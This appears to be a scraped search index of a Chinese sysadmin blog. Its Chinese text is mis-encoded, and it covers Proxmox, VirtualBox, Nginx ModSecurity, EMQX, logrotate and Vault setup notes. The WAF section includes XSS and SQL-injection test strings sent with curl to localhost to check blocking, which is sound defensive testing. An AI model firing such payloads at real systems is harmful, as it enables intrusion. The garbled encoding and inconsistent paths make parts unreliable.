m","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸€)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(äºŒ)","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(äºŒ)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"debian 12 ä¸‹ ROOTN ç”¨æˆ·ï¼Œæ— æ³•è®¾ç½®ä¸­æ–‡é—®é¢˜ å…·ä½“ä½“ç°æ˜¯ï¼Œç³»ç»Ÿæ— è®ºå¦‚ä½•è®¾ç½®ï¼Œç»ˆç«¯å˜é‡å§‹ç»ˆä¸º LANG=C å’Œ LANGUAGE=C, æ£€æŸ¥äº†æ‰€æœ‰è®¾ç½®ï¼Œæœ€åå‘ç°åœ¨~/.profileä¸­ï¼Œè®¾ç½®äº†è¿™ä¸¤ä¸ªå˜é‡ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦è¿™æ ·å¹²ï¼Œåˆ äº†é‡è½½ä¸‹å°±å¯ä»¥äº† debian ç³»ç»Ÿä¸‹ï¼Œ vim æ‰“å¼€æ–‡ä»¶åé¼ æ ‡é€‰æ‹©ä¸ºå¯è§†æ¨¡å¼é—®é¢˜ å…¨å±€ä¿®æ”¹: ç¼–è¾‘ /usr/share/vim/vim82/defaults.vim , å¤§æ¦‚åœ¨ 80 è¡Œ: if has('mouse') ä¸‹ï¼Œå°† set mouse=a æ”¹ä¸º set mouse= å³å¯ nginx æ·»åŠ  ssl è¯ä¹¦å ï¼Œ æµè§ˆå™¨ä»ç„¶æç¤º ä¸å®‰å…¨(ä½ ä¸æ­¤ç½‘ç«™ä¹‹é—´å»ºç«‹çš„è¿æ¥å¹¶éå®Œå…¨å®‰å…¨) å¤šæ•°æ˜¯å› ä¸ºæ··åˆå†…å®¹ï¼Œåœ¨ç½‘ç«™é¡µé¢æ–‡ä»¶ä¸­,åŒ…å«äº†å…¶ä»–ç½‘ç«™éhttpsçš„èµ„æº å…±äº«ä¸€ä¸ªæˆ‘è‡ªå·±ç”¨çš„ Bash Prompt # ~/.bashrc # need expand scripts: add https://github.com/git/git/blob/master/contrib/completion/git-prompt.sh to profile.d _PS1_CMD_=\"\\${VIRTUAL_ENV_PROMPT}\\\\\\\\[\\\\\\\\][\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;5m\\\\]\\\\u\\\\[\\$(tput sgr0)\\\\]@\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;70m\\\\]\\\\h\\\\[\\$(tput sgr0)\\\\] \\\\W]\\\\[\\$(tput sgr0)\\\\]\\\\[\\\\033[38;5;77m\\\\]\\${__GIT_BRANCH__}\\\\[\\\\033[38;5;9m\\\\][\\\\\\$?]\\\\[\\$(tput sgr0)\\\\]\\\\\\\\\\$ \\\\[\\$(tput sgr0)\\\\]\" export PROMPT_COMMAND=\"${PROMPT_COMMAND}; __GIT_BRANCH__=\\\"\\$(__git_ps1 '(%s)')\\\"; PS1=\\\"${_PS1_CMD_}\\\"\" # export PS1=\"[\\[$(tput sgr0)\\]\\[\\033[38;5;5m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;70m\\]\\h\\[$(tput sgr0)\\] \\W]\\[$(tput sgr0)\\]\\[\\033[38;5;9m\\][\\$?]\\[$(tput sgr0)\\]\\\\$ \\[$(tput sgr0)\\]\" windows ç³»ç»Ÿä¸­ä»£ç†è®¾ç½®é—®é¢˜ ç³»ç»Ÿè®¾ç½®ä¸­, é»˜è®¤ä»£ç†è®¾ç½®ä½¿ç”¨çš„æ˜¯ http æ¨¡å¼ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨ socksæ¨¡å¼ï¼Œåˆ™åœ¨åœ°å€æ è¾“å…¥ socks=\u003cproxy_ip\u003eï¼Œç«¯å£ä¸ºsocksç«¯å£å³å¯(socksæ¨¡å¼ä»…åœ¨win11ä¸Šè¿›è¡Œæµ‹è¯•ï¼Œå…¶ä»–ç³»ç»Ÿå‚è€ƒæ‰§è¡Œ) windows æŒ‚è½½ sshfs æ–¹æ³• æœ¬æ–¹æ¡ˆçœ‹åˆ°åˆ«äººæˆåŠŸè¿‡ï¼Œä½†è‡ªå·±æ²¡æœ‰æµ‹è¯•æˆåŠŸ å®‰è£…ä»¥ä¸‹å†…å®¹, æ‰“å¼€ sshfs-win-manager æ­£å¸¸é…ç½®æŒ‚è½½: https://github.com/winfsp/winfsp https://github.com/winfsp/sshfs-win https://github.com/evsar3/sshfs-win-manager Proxmox VE ä¸­ä½¿ç”¨ Cloud ç³»ç»Ÿé•œåƒå¿«é€Ÿåˆ›å»ºè™šæ‹Ÿæœº https://www.truenasscale.com/2022/05/24/1117.html https://fairysen.com/742.html#toc-head-6 åˆ›å»ºè™šæ‹Ÿæœº, æ“ä½œç³»ç»Ÿè®¾ç½®ï¼Œé€‰æ‹© ä¸ä½¿ç”¨ä»»ä½•ä»‹è´¨ ç³»ç»Ÿ è®¾ç½®å°† SCSIæ§åˆ¶å™¨ è°ƒæ•´ä¸º VirtIO SCSI, æœºå™¨å¯ä»¥è®¾ç½®ä¸ºq35ä¹Ÿå¯ä»¥é»˜è®¤ ç£ç›˜ è®¾ç½®åˆ é™¤æ‰æ‰€æœ‰çš„é»˜è®¤å³å¯, æœ€åå®Œæˆåˆ›å»º å®Œæˆåˆ›å»ºå, ç™»é™†åˆ° PVE ä¸»æœºä¸Šé¢ï¼Œä½¿ç”¨å‘½ä»¤qm importdisk 100 aliyun_3_x64_20G_nocloud_alibase_20240528.qcow2 local-lvm å°† qcow2 å¯¼å…¥åˆ°è™šæ‹Ÿæœºä¸­ï¼Œ100ä¸ºè™šæ‹Ÿæœºçš„VM ID, local-lvmæ˜¯è¦å­˜å‚¨çš„ä½ç½®ï¼Œ æ²¡æœ‰ qm å‘½ä»¤ï¼Œå®‰è£…ä¸‹ cloud-init è½¯ä»¶åŒ… å¯¼å…¥å®Œæˆåï¼Œ åœ¨ç¡¬ä»¶é‡Œé¢å¯ä»¥çœ‹åˆ°ä¸€ä¸ª æœªä½¿ç”¨çš„ç£ç›˜0, ç„¶ååŒå‡»ç¼–è¾‘, ä¸€èˆ¬é»˜è®¤å³å¯(æ€»çº¿/è®¾å¤‡è°ƒæ•´ä¸ºSCSI) åœ¨ é€‰é¡¹ ä¸­ï¼Œé€‰æ‹© å¼•å¯¼é¡ºåºï¼Œå°†æ·»åŠ çš„é‚£å—ç£ç›˜è®¾ä¸ºç¬¬ä¸€å¯åŠ¨é¡¹ åœ¨ Cloud-init ä¸­ï¼Œè®¾ç½®ä¸‹ ç”¨æˆ·å / å¯†ç  å¯åŠ¨è™šæ‹Ÿæœº Virtualbox ä¸­ä½¿ç”¨ Cloud ç³»ç»Ÿé•œåƒå¿«é€Ÿåˆ›å»ºè™šæ‹Ÿæœº ä»¥Alibaba Cloud Linux 3äº‘é•œåƒä¸ºä¾‹ï¼Œä¸‹è½½aliyun_3_x64_20G_nocloud_alibase_20240528.vhd å’Œ seed.img, seed.imgæ˜¯ cloud-init æ•°æ®æºï¼Œå¯ä»¥è‡ªå·±åˆ›å»ºå‚è€ƒå®˜æ–¹æ–‡æ¡£æˆ–è€…é˜¿é‡Œäº‘æ–‡æ¡£çš„ç”Ÿæˆç¤ºä¾‹ã€‚ è™šæ‹Ÿæœºåˆ›å»ºå’Œé…ç½® æ–°å»ºè™šæ‹Ÿæœºï¼Œ è™šæ‹Ÿæœºå…‰ç›˜æ— éœ€æŒ‡å®šï¼Œç±»å‹å’Œç‰ˆæœ¬æŒ‰ç…§è‡ªå·±ä½¿ç”¨çš„äº‘é•œåƒæŒ‡å®šï¼Œç„¶åä¸€ç›´ä¸‹ä¸€æ­¥, è™šæ‹Ÿç¡¬ç›˜é€‰æ‹©ä¸æ·»åŠ è™šæ‹Ÿç¡¬ç›˜ï¼Œ ç„¶åç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œ ç›´åˆ°å®Œæˆåˆ›å»ºã€‚ å®Œæˆåˆ›å»ºå, å³é”®åˆ›å»ºå¥½çš„è™šæ‹Ÿæœºï¼Œé€‰æ‹©è®¾ç½®ï¼Œ ç†è®ºä¸Šæ‰€æœ‰è®¾ç½®éƒ½å¯ä»¥ä½¿ç”¨é»˜è®¤å€¼ï¼Œ åªéœ€è¦æ›´æ”¹ä¸€ä¸ªåœ°æ–¹ã€‚ é€‰æ‹© å­˜å‚¨ï¼Œé€‰æ‹©æ§åˆ¶å™¨: IDEï¼Œå³é”®æ·»åŠ cloud-initæº, å°±æ˜¯ä¸‹è½½çš„é‚£ä¸ªseed.imgæˆ–è€…è‡ªå·±åˆ›å»ºçš„(éœ€è¦å…ˆæ³¨å†Œåˆ°Virtualboxï¼Œè¿™ä¸ªæ­¥éª¤åœ¨æµ‹è¯•æ—¶å€™å‘ç°ä¸åšä¼¼ä¹æ²¡ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯è¿›å»åä½¿ç”¨çš„æ˜¯ä¸‹è½½é•œåƒé»˜è®¤çš„å¸å·åå¯†ç ï¼ŒAlibaba Cloud Linux 3çš„æ˜¯alinux:aliyun,è¿™ä¸ªåœ¨é˜¿é‡Œäº‘æ–‡æ¡£ä¸­æ‰‹åŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°)ã€‚ é€‰æ‹© å­˜å‚¨ , é€‰æ‹© æ§åˆ¶å™¨: SATA, åœ¨å³ä¾§è®¾ç½®ä¸­å°†å‹å·æ”¹ä¸ºvirtio-scsi(è¿™ä¸ªæ­¥éª¤æ˜¯å¿…é¡»çš„), ç„¶åå³é”®æ·»åŠ ç¡¬ç›˜, é€‰æ‹©ä¸‹è½½çš„aliyun_3_x64_20G_nocloud_alibase_20240528.vhd(åŒæ ·éœ€è¦å…ˆæ³¨å†Œåˆ°Virtualbox)ã€‚ é€‰æ‹© ç½‘ç»œï¼Œè¿æ¥æ–¹å¼æ ¹æ®è‡ªå·±æƒ…å†µè°ƒæ•´ï¼Œé«˜çº§ä¸­æ§åˆ¶èŠ¯ç‰‡ä¿®æ”¹ä¸º å‡†è™šæ‹ŸåŒ–ç½‘ç»œ(virtio-net), ç„¶åç¡®å®šä¿®æ”¹ã€‚ æœ€åæ­£å¸¸å¯åŠ¨è™šæ‹Ÿæœºå³å¯(æ³¨æ„ï¼š ç¬¬ä¸€æ¬¡å¯åŠ¨å¯èƒ½ä¼šæ¯”è¾ƒæ…¢ï¼Œå¤šç­‰å¾…ä¸€äº›æ—¶é—´å°±å¯ä»¥äº†ï¼Œ å¯åŠ¨åæ³¨æ„å…ˆé…ç½®å¥½ç½‘ç»œ). PVE æ·»åŠ é¢å¤–èœå•-ç›‘æ§ç»„ä»¶ // å½“å‰æµ‹è¯•ç‰ˆæœ¬ä¸º 8.2.2 // ä¿®æ”¹Webç•Œé¢æºä»£ç  /usr/share/pve-manager/js/pvemanagerlib.js(æ³¨æ„å¤‡ä»½) // æœç´¢åˆ°å†…å®¹ `if (caps.nodes['Sys.Audit']) {`ï¼Œå¤§æ¦‚åœ¨ 43869 è¡Œ, æ³¨æ„æœç´¢ç»“æœä¼šæœ‰å¤šä¸ªã€‚ // å¯ä»¥å°†å‰ç«¯ç•Œé¢ä¿®æ”¹ä¸ºè‹±æ–‡ï¼Œç„¶åéšä¾¿æ”¹ä¸€ä¸ª gettext å†…çš„å†…å®¹åˆ·æ–°ï¼Œçœ‹æ˜¯å¦æ‰¾å¯¹ä½ç½®ã€‚ // æ·»åŠ èœå•ï¼Œå®Œæ•´å†…å®¹å¦‚ä¸‹ if (caps.nodes['Sys.Audit']) { me.items.push( { xtype: 'pveNodeSummary', title: gettext('Summary'), iconCls: 'fa fa-book', itemId: 'summary', }, { xtype: 'pmxNotesView', title: gettext('Notes'), iconCls: 'fa fa-sticky-note-o', itemId: 'notes', }, /// æ·»åŠ å†…å®¹å¼€å§‹ { xtype: 'prometheusMonitorView', title: 'Prometheus ç›‘æ§', iconCls: 'fa fa-line-chart', itemId: 'note-prometheus', } /// æ·»åŠ å†…å®¹ç»“æŸ ); } /// åœ¨æ–‡ä»¶æœ€æœ«å°¾æ·»åŠ  Ext.define('PVE.node.PrometheusMonitor', { extend: 'Ext.panel.Panel', alias: 'widget.prometheusMonitorView', scrollable: true, bodyPadding: 5, initComponent: function() { var me = this; var prometheusIframe = { xtype: 'component', autoEl: { tag: 'iframe', style: 'height: 100%; width: 100%; border: none;', src: 'https://sogou.com', frameborder: 0, scrolling: 'auto' } }; Ext.apply(me, { layout: 'fit', items: [prometheusIframe] }); me.callParent(); } }); binlog è§£æå·¥å…· https://github.com/zhuchao941/canal2sql # å¸¸ç”¨å‚æ•° ## -sql_type: åªè§£ææŒ‡å®šç±»å‹ï¼Œæ”¯æŒ insert,update,delete,ddlã€‚å¤šä¸ªç±»å‹ç”¨é€—å·éš”å¼€ï¼Œå¦‚--sql-type=insert,deleteã€‚å¯é€‰ã€‚é»˜è®¤ä¸ºinsert,update,delete,ddl ## -filter: ç™½åå•,æŒ‡å®šå¯¼å‡ºï¼Œå¤šä¸ªé€—å·éš”å¼€ \u003cåº“å\u003e.\u003cè¡¨å\u003e(db.*ã€*.*) ## -mode: onli","date":"2021-08-04","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(äºŒ)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸‰)","date":"2025-06-17","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸‰)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Nginx å®‰è£… ModSecurity WAF ä»¥å¢å¼ºç½‘ç«™å®‰å…¨ Nginx å®‰è£… ModSecurity WAF ä»¥å¢å¼ºç½‘ç«™å®‰å…¨ ModSecurity WAF è¿æ¥å™¨æ‰©å±•ä¾èµ– $\u003e yum install -y libmodsecurity-devel ä¸‹è½½ ModSecurity WAF è¿æ¥å™¨ $\u003e git clone https://github.com/owasp-modsecurity/ModSecurity-nginx.git ç¼–è¯‘å®‰è£… $\u003e cd /data/softsrc/openresty-1.21.4.1 $\u003e ./configure --prefix=/opt/nginxss --add-module=/pathto/ModSecurity-nginx \u0026\u0026 make \u0026\u0026 make install åˆ›å»ºé…ç½®æ–‡ä»¶ç›®å½• $\u003e mkdir /opt/nginxssl/conf/modsec æ ¸å¿ƒè§„åˆ™é…ç½® $\u003e cd /opt/nginxssl/conf/modsec \u0026\u0026 git clone https://github.com/coreruleset/coreruleset.git $\u003e cd /opt/nginxssl/conf/modsec/coreruleset \u0026\u0026 cp -v crs-setup.conf.example crs-setup.conf ä¸‹è½½ ModSecurity é…ç½®ç›¸å…³æ–‡ä»¶ $\u003e wget -O /opt/nginxssl/conf/modsec/modsecurity.conf https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended $\u003e wget -O /opt/nginxssl/conf/modsec/unicode.mapping https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/unicode.mapping åˆ›å»ºå…¥å£æ–‡ä»¶ $\u003e vim /opt/nginxssl/conf/modsec/main.conf Include /opt/nginxssl/conf/conf/modsec/modsecurity.conf Include /opt/nginxssl/conf/modsec/coreruleset/crs-setup.conf Include /opt/nginxssl/conf/modsec/coreruleset/rules/*.conf ä¿®æ”¹é…ç½®æ–‡ä»¶ modsecurity.conf $\u003e vim /opt/nginxssl/conf/modsec/modsecurity.conf ## DetectionOnly åªè®°å½•ï¼Œä¸æ‹¦æˆª ## On æ‹¦æˆªå¹¶è®°å½• ## Off å®Œå…¨å…³é—­ # SecRuleEngine DetectionOnly SecRuleEngine On # ä»¥ä¸‹ä¸ºå…³é”®é…ç½®ï¼Œ æ ¸å¿ƒå…³æ³¨SecAuditLog ã€ SecAuditLogFormat é…ç½® SecAuditEngine RelevantOnly SecAuditLog /var/log/modsec_audit.log SecAuditLogParts ABIJDEFHZ SecAuditLogType Serial SecAuditLogFormat JSON # è®¾ç½®ä¸º JSON æ ¼å¼ï¼Œæ–¹ä¾¿æŸ¥çœ‹ ä¿®æ”¹ nginx é…ç½®æ–‡ä»¶å¯ç”¨ ModSecurity WAF $\u003e vim /opt/nginxssl/conf/nginx.conf # http or server or location modsecurity on; modsecurity_rules_file /opt/nginxssl/conf/modsec/main.conf; æ‹¦æˆªæµ‹è¯• $\u003e curl \"http://127.0.0.1/?param=\u003cscript\u003ealert(1)\u003c/script\u003e\" # sql æ³¨å…¥ $\u003e curl \"http://127.0.0.1/?param=1' AND 1=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users WHERE '1'='1\" ç™½åå•æ·»åŠ æ–¹æ¡ˆ $\u003e vim /opt/nginxssl/conf/modsec/modsecurity.conf # SecRuleEngine ä¹‹åé…ç½®ï¼Œ å…¶ä¸­id å­—æ®µå”¯ä¸€ # è·³è¿‡ 192.168.1.100 çš„å…¨éƒ¨ ModSecurity æ£€æŸ¥ SecRule REMOTE_ADDR \"@ipMatch 192.168.1.100\" \"id:10000,phase:1,pass,nolog,ctl:ruleEngine=Off\" å…¶ä»–ç™½åå•æ–¹æ¡ˆ(æœªæµ‹è¯•) # é™åˆ¶æŸè·¯å¾„ä»…ç‰¹å®š IP å¯è®¿é—® SecRule REQUEST_URI \"^/admin\" \"phase:1,deny,id:20001,msg:'Forbidden access to /admin',chain\" SecRule REMOTE_ADDR \"!@ipMatch 192.168.1.100\" # ç¦æ­¢æŸè·¯å¾„ä½¿ç”¨ GET è¯·æ±‚ SecRule REQUEST_URI \"^/secure-action\" \"phase:1,deny,id:20002,msg:'GET not allowed here',chain\" SecRule REQUEST_METHOD \"@streq GET\" # ä»…å…è®¸ç‰¹å®š Referer æˆ– User-Agent è®¿é—®æŸè·¯å¾„ SecRule REQUEST_URI \"^/api/private\" \"phase:1,deny,id:20003,msg:'Blocked non-authorized client',chain\" SecRule REQUEST_HEADERS:User-Agent \"!@streq MyTrustedClient/1.0\" # è¿˜å¯ä»¥åœ¨ä¸åŒçš„locationä¸‹å•ç‹¬è®¾ç½®å¯ç”¨ä¸åŒè§„åˆ™ï¼Œç”¨ä»¥å®ç°å¤šå…ƒåŒ– Rsync åŒæ­¥çš„è½¯é“¾æ¥å‡ºç°ï¼ŒåŒæ­¥ç»“æœæŒ‡å‘ç›®æ ‡ä¼šå¤šä¸€ä¸ª /rsyncd-munged/ # /rsyncd-munged/ æ˜¯ä¸ºäº†é˜²æ­¢å®¢æˆ·ç«¯é€šè¿‡ä¸Šä¼ çš„é“¾æ¥è·³å‡ºæ¨¡å—ç›®å½•ï¼ˆå®‰å…¨ä¿æŠ¤ï¼‰ # rsyncd.conf æ·»åŠ é…ç½®ï¼Œé‡å¯æœåŠ¡ use chroot = yes # å»ºè®®å¼€å¯æ­¤é¡¹ï¼Œå¦‚æœåŒæ—¶å…³é—­ munge ï¼Œå¯èƒ½é€ æˆé¢å¤–çš„å®‰å…¨éšæ‚£ munge symlinks = no emqx è¿ç§» emqxè¿ç§»åªéœ€è¦å¤‡ä»½ etc å’Œ data ç›®å½•ï¼Œä¿æŒè¿ç§»å‰åç‰ˆæœ¬ä¸€è‡´, ç„¶ååœ¨æ–°èŠ‚ç‚¹åŠ è½½è¿™ä¸¤ä¸ªç›®å½•å³å¯ã€‚ # å½“å‰è¿ç§»ç¤ºä¾‹ä¸ºwinåˆ°linux # windows å¤‡ä»½ # å…ˆåœæ‰æœåŠ¡ ï¼Œ ç„¶åç›´æ¥æ‰“åŒ… etc å’Œ data ç›®å½• $\u003e emqx stop # linux æ¢å¤ ## åˆ›å»ºç›®å½• $\u003e mkdir -p data/{etc,data,log} # è§£å‹å¤‡ä»½æ–‡ä»¶ data åˆ° data ï¼Œ etc åˆ° etc # è°ƒæ•´æƒé™ $\u003e chown -R 1000:1000 data # å®¹å™¨æ–¹å¼è¿è¡Œï¼Œ åˆ›å»ºcomposeæ–‡ä»¶ (æ³¨æ„: ç‰©ç†ç¯å¢ƒéƒ¨ç½²è¿ç§»åˆ°å®¹å™¨ç¯å¢ƒï¼Œå¯èƒ½å¯¼è‡´ node ä¿¡æ¯ä¸ä¸€è‡´ï¼Œå¯¼è‡´è¿ç§»å¤±è´¥ï¼Œå¦‚æœæ˜¯æ­¤æƒ…å†µï¼Œå»ºè®®é‡æ–°éƒ¨ç½²) $\u003e vim docker-compose.yml services: emqx: image: emqx/emqx:5.3.2 container_name: emqx restart: always environment: - EMQX_NODE_NAME=emqx@localhost ports: - \"1883:1883\" # MQTT - \"8883:8883\" # MQTT over TLS - \"8083:8083\" # MQTT over WebSocket - \"8084:8084\" # MQTT over WSS - \"18083:18083\" # Dashboard volumes: - ./data/etc:/opt/emqx/etc - ./data/data:/opt/emqx/data - ./data/log:/opt/emqx/log # å¯åŠ¨æœåŠ¡ $\u003e docker-compose up -d Fedora ç³»ç»Ÿç•Œé¢é»˜è®¤å­—ä½“æ˜¯ Adwaita sansï¼ŒUbuntu é»˜è®¤æ˜¯ Ubuntu sansï¼Œ çœ‹èµ·æ¥è¿˜æ˜¯æœ‰äº›å·®å¼‚çš„ï¼Œ æ„Ÿè§‰è¿˜æ˜¯ Adwaita sans å¥½çœ‹ä¸€äº› logrotate æ—¥å¿—è½®è½¬ç¤ºä¾‹ $\u003e vim /etc/logrotate.d/app-logs /var/log/myapp/*.log { daily # æ¯å¤©è½®è½¬ rotate 30 # ä¿ç•™ 30 ä¸ªå½’æ¡£ missingok # æ–‡ä»¶ä¸å­˜åœ¨ä¸æŠ¥é”™ notifempty # ç©ºæ–‡ä»¶ä¸è½®è½¬ compress # å‹ç¼©å½’æ¡£ï¼ˆgzipï¼‰ delaycompress # å»¶è¿Ÿå‹ç¼©ï¼ˆä¸‹æ¬¡è½®è½¬æ—¶å‹ç¼©ï¼‰ dateext # ä½¿ç”¨æ—¥æœŸåç¼€ï¼ˆå¦‚ .20251024ï¼‰ dateformat -%Y%m%d # æ—¥æœŸæ ¼å¼ create 0640 appuser appgroup # åˆ›å»ºæ–°æ–‡ä»¶æƒé™ sharedscripts # æ‰€æœ‰æ—¥å¿—è½®è½¬å®Œååªæ‰§è¡Œ","date":"2025-06-17","objectID":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æ‚ä¸ƒæ‚å…«çš„è®°å½•(ä¸‰)","uri":"/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.3/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†","other"],"content":"å®ç°åŸºäºHashiCorp Vaultçš„MySQLæ•°æ®åº“å‡­æ®åŠ¨æ€ç®¡ç†ï¼ŒåŒ…æ‹¬åŠ¨æ€è§’è‰²ã€é™æ€è§’è‰²è‡ªåŠ¨è½®æ¢ã€ç›‘æ§å‘Šè­¦å’Œå®‰å…¨å®¡è®¡ã€‚","date":"2025-11-18","objectID":"/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/","tags":["linux","è§£å†³æ–¹æ¡ˆ","other"],"title":"HashiCorp Vaultçš„MySQLæ•°æ®åº“å‡­æ®åŠ¨æ€ç®¡ç†","uri":"/posts/linux/vault%E7%9A%84mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%AD%E6%8D%AE%E5%8A%A8%E6%80%81%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†","other"],"content":" æ³¨æ„ æœ¬ç« å†…å®¹ä¸º DeepSeek å¯¹è¯æ€»ç»“å½’æ¡£è€Œæ¥ï¼Œæ–‡ç« å†…å®¹ç”±åšä¸»å…¨ç¨‹æµ‹è¯•ï¼Œæ­¤æ–‡æ¡£åŸç›®çš„æ˜¯ä¸ºäº†è®°å½• HashiCort Vault å¯ä»¥å®ç° Mysql æ•°æ®åº“åŠ¨æ€å‡­æ®ç®¡ç†(PCIè§„èŒƒè¦æ±‚æ•°æ®åº“å¯†é’¥éœ€è¦åŠ¨æ€è½®æ¢)ï¼Œä»…é™å‚è€ƒ ğŸ“‹ é¡¹ç›®æ¦‚è¿° ç›®æ ‡ å®ç°åŸºäºHashiCorp Vaultçš„MySQLæ•°æ®åº“å‡­æ®åŠ¨æ€ç®¡ç†ï¼ŒåŒ…æ‹¬åŠ¨æ€è§’è‰²ã€é™æ€è§’è‰²è‡ªåŠ¨è½®æ¢ã€ç›‘æ§å‘Šè­¦å’Œå®‰å…¨å®¡è®¡ã€‚ æ¶æ„ç»„ä»¶ Vault Server: å‡­æ®ç®¡ç†ä¸­å¿ƒ MySQL: ç›®æ ‡æ•°æ®åº“ åŠ¨æ€è§’è‰²: çŸ­æœŸå‡­æ®ï¼ˆ30åˆ†é’ŸTTLï¼‰ é™æ€è§’è‰²: é•¿æœŸå‡­æ®ï¼ˆ24å°æ—¶è‡ªåŠ¨è½®æ¢ï¼‰ ç›‘æ§ä½“ç³»: ç§Ÿçº¦ç®¡ç†ã€å¥åº·æ£€æŸ¥ã€å‘Šè­¦è§„åˆ™ ğŸ”§ é˜¶æ®µ1ï¼šåŸºç¡€ç¯å¢ƒé…ç½® 1.1 MySQLå®¹å™¨éƒ¨ç½² # å¯åŠ¨MySQLæµ‹è¯•å®¹å™¨ docker run -d \\ --name mysql-vault-test \\ -e MYSQL_ROOT_PASSWORD=rootpassword123 \\ -e MYSQL_DATABASE=vault_test \\ -p 3306:3306 \\ mysql:8.0 # éªŒè¯è¿æ¥ docker exec -i mysql-vault-test mysql -uroot -prootpassword123 -e \"SHOW DATABASES;\" 1.2 Vaultæ•°æ®åº“å¼•æ“é…ç½® # å¯ç”¨æ•°æ®åº“å¯†é’¥å¼•æ“ /opt/vault/bin/vault secrets enable database # é…ç½®MySQLè¿æ¥ /opt/vault/bin/vault write database/config/mysql-vault \\ plugin_name=mysql-database-plugin \\ connection_url=\"{{username}}:{{password}}@tcp(127.0.0.1:3306)/\" \\ allowed_roles=\"vault-dynamic-role\" \\ username=\"root\" \\ password=\"rootpassword123\" ğŸ” é˜¶æ®µ2ï¼šåŠ¨æ€è§’è‰²é…ç½® 2.1 åŠ¨æ€è§’è‰²å®šä¹‰ /opt/vault/bin/vault write database/roles/vault-dynamic-role \\ db_name=mysql-vault \\ creation_statements=\"CREATE USER '{{name}}'@'%' IDENTIFIED BY '{{password}}';GRANT SELECT, INSERT, UPDATE, DELETE ON vault_test.* TO '{{name}}'@'%';\" \\ default_ttl=\"30m\" \\ max_ttl=\"2h\" \\ revocation_statements=\"REVOKE ALL PRIVILEGES ON vault_test.* FROM '{{name}}'@'%'; DROP USER '{{name}}'@'%';\" 2.2 åŠ¨æ€å‡­æ®ä½¿ç”¨ # è·å–åŠ¨æ€å‡­æ® /opt/vault/bin/vault read database/creds/vault-dynamic-role # éªŒè¯MySQLæƒé™ mysql -u\u003cåŠ¨æ€ç”¨æˆ·å\u003e -p\u003cåŠ¨æ€å¯†ç \u003e -e \"SHOW GRANTS;\" ğŸ”„ é˜¶æ®µ3ï¼šé™æ€è§’è‰²è‡ªåŠ¨è½®æ¢ 3.1 åˆ›å»ºé™æ€ç”¨æˆ· # åœ¨MySQLä¸­åˆ›å»ºé™æ€ç”¨æˆ· docker exec -i mysql-vault-test mysql -uroot -prootpassword123 -e 'CREATE USER \"vault_static_user\"@\"%\" IDENTIFIED BY \"TempPassword123!\"; GRANT SELECT, INSERT ON vault_test.* TO \"vault_static_user\"@\"%\";' 3.2 é…ç½®é™æ€è§’è‰² # 